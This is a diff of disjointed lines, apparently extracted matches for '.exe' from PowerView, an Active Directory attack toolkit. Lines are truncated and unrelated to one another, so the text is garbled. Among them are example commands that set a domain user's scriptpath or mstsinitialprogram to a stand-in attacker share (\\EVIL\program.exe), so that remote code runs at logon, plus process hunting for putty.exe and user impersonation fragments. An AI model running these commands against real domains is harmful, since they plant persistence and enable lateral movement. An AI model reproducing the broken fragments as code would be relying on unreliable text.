@@ -1,0 +1,16 @@
+            # find .exe
+            $SearcherArguments['Include'] = @('*.exe
+          if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe
+"        #   this is to simulate ""runas.exe"
+"        Write-Warning ""[Invoke-UserImpersonation] powershell.exe"
+"1108"",""testuser"" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe"
+Find-DomainProcess -ProcessName putty.exe
+Searchings for instances of putty.exe
+Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe
+Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe
+Switch. Find .EXE
+VERBOSE: Setting mstsinitialprogram to \\EVIL\program.exe
+VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe
+VERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\EVIL\program2.exe
+\\EVIL\program2.exe
+using reflection (i.e. csc.exe
